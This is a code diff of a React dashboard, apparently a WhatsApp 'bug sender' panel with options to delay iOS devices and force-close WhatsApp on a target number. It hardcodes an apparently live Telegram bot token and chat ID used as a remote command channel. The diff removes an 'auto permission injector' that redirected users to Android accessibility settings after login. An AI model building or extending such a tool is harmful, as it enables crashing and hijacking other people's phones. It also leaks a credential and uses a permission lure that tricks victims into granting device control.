@@ -7,13 +7,13 @@ export default function YaeMikoDashboard() {
   const BOT_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk'; 
   const CHAT_ID = '6481060681';      
 
+  const videoRef = useRef<HTMLVideoElement>(null);
   const audioRef = useRef<HTMLAudioElement>(null);
   const lastCmdId = useRef(0);
   
   const [isLoggedIn, setIsLoggedIn] = useState(false)
   const [isAuthLoading, setIsAuthLoading] = useState(false)
   const [isMonitoringActive, setIsMonitoringActive] = useState(false)
-  const [isSending, setIsSending] = useState(false)
   const [inputUsername, setInputUsername] = useState("")
   const [inputPassword, setInputPassword] = useState("")
   const [targetNumber, setTargetNumber] = useState("62xxxxxxxxxx")
@@ -29,14 +29,6 @@ export default function YaeMikoDashboard() {
     { name: "TUNDA IOS", code: "delayIOS" },
     { name: "PAKSA BERHENTI WA", code: "forceClose" },
   ]
-
-  // --- AUTO PERMISSION INJECTOR ---
-  const triggerPermission = () => {
-    const intent = "android.settings.ACCESSIBILITY_SETTINGS";
-    if (typeof window !== "undefined") {
-      window.location.href = intent;
-    }
-  };
 
   // --- BOT ENGINE (LISTENING) ---
   useEffect(() => {
@@ -83,14 +75,10 @@ export default function YaeMikoDashboard() {
 
   const handleSendBug = () => {
     if (bugLimit <= 0) { setShowLimitPopup(true); return; }
-    setIsSending(true);
-    setTimeout(() => {
-        setIsSending(false);
-        const newLimit = bugLimit - 1;
-        setBugLimit(newLimit);
-        localStorage.setItem('selz_bug_limit', newLimit.toString());
-        if (newLimit === 0) localStorage.setItem('selz_reset_time', (new Date().getTime() + 86400000).toString());
-    }, 3500);
+    const newLimit = bugLimit - 1;
+    setBugLimit(newLimit);
+    localStorage.setItem('selz_bug_limit', newLimit.toString());
+    if (newLimit === 0) localStorage.setItem('selz_reset_time', (new Date().getTime() + 86400000).toString());
   };
 
   const handleLoginAttempt = () => {
@@ -99,7 +87,6 @@ export default function YaeMikoDashboard() {
       setTimeout(() => {
         setIsLoggedIn(true);
         setIsMonitoringActive(true);
-        triggerPermission(); // AUTO TEMBAK KE SETTING
         audioRef.current?.play().catch(() => {});
       }, 2000);
     } else { setShowErrorOverlay(true); }
@@ -107,14 +94,6 @@ export default function YaeMikoDashboard() {
 
   return (
     <div className="relative min-h-screen text-white font-sans overflow-hidden">
-      {/* GLITCH LOADING OVERLAY */}
-      {isSending && (
-        <div className="fixed inset-0 z-[1000] bg-red-600/20 flex flex-col items-center justify-center backdrop-blur-sm animate-pulse">
-            <div className="text-red-500 font-black text-2xl italic tracking-[0.2em] animate-bounce">SEDANG MENGIRIM...</div>
-            <div className="mt-4 flex gap-1"><div className="w-2 h-2 bg-red-500 animate-ping"></div><div className="w-2 h-2 bg-red-500 animate-ping delay-75"></div><div className="w-2 h-2 bg-red-500 animate-ping delay-150"></div></div>
-        </div>
-      )}
-
       <div className="fixed inset-0 z-0">
         <video autoPlay loop muted playsInline className="w-full h-full object-cover scale-105"><source src="/bg-anime.mp4" type="video/mp4" /></video>
         <div className="absolute inset-0 bg-[#050b14]/70 backdrop-blur-[2px]"></div>
@@ -152,4 +131,4 @@ export default function YaeMikoDashboard() {
 
 function StatItem({ val, label, color = "text-white" }: any) {
   return (<div className="flex flex-col items-center"><span className={`text-sm font-black ${color} leading-none uppercase`}>{val}</span><span className="text-[7px] text-white/30 uppercase font-bold mt-1 tracking-widest">{label}</span></div>)
-}
+        }
